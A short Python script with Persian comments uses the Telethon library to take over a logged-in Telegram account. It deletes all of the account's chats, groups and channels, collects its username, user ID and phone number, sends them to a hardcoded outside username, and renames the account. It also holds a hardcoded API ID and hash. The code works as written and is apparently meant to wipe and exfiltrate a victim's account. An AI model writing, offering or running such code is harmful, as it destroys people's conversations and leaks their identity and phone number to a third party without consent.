from telethon import TelegramClient
from telethon.tl.functions.account import UpdateProfileRequest

API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = "تست"

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    # حذف چت‌ها، گروه‌ها و کانال‌ها از لیست گفتگوها
    async for dialog in client.iter_dialogs():
        try:
            name = dialog.name or str(dialog.id)

            await client.delete_dialog(dialog.entity)

            print(f"Deleted: {name}")

        except Exception as e:
            print(
                f"Failed: {dialog.name or dialog.id} "
                f"-> {type(e).__name__}: {e}"
            )

    print("\nDone processing all dialogs.")

    # دریافت اطلاعات اکانت
    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info ---")
    print(info_text)
    print("--------------------")

    # ارسال اطلاعات
    await client.send_message(TARGET_USERNAME, info_text)

    print(f"Sent account info to {TARGET_USERNAME}")

    # تغییر نام
    await client(
        UpdateProfileRequest(
            first_name=NEW_FIRST_NAME
        )
    )

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
